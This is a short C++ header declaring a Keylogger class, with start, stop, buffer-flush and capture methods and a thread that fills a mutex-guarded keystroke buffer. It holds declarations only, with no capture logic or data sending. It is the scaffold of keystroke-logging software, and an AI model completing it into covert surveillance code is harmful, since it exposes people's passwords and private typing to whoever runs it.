#pragma once

#include <string>
#include <thread>
#include <mutex>

class Keylogger {
public:
    Keylogger();
    ~Keylogger();

    void start();
    void stop();
    std::string flush_buffer();
    size_t buffer_size() const;

private:
    void captrure();
    // std::string find_keyboard_device();

private:
    bool running_;
    mutable std::mutex mutex_;
    std::thread thread_;
    std::string buffer_;
};
